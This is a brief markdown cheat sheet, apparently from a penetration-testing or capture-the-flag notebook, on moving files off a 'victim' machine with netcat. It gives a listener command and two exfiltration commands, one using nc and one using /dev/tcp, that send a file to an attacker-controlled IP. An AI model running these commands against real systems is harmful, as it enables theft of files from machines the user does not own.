---
tags:
  - "#networking"
  - "#netcat"
  - "#file-transfer"
---
# 📁 File Transfer Using Netcat

## 🖥️ Step 1: Start Listening on Local Machine (Kali)

Run the following command to start listening for incoming files:

```bash
nc -lp 4444 > filename    # waiting for receiving the files
````

---

## 📤 Step 2: Transfer File from Remote Machine (Victim)

Run this command on the victim machine to send the file:

```bash
nc -w 3 10.10.14.19 4444 < filename    # it's time to send the file
```

**OR**, use this alternative method:

```bash
cat filename > /dev/tcp/10.10.14.19/4444
```

> **Note:** `10.10.14.19` is the IP address of the **local machine (tun0)**.

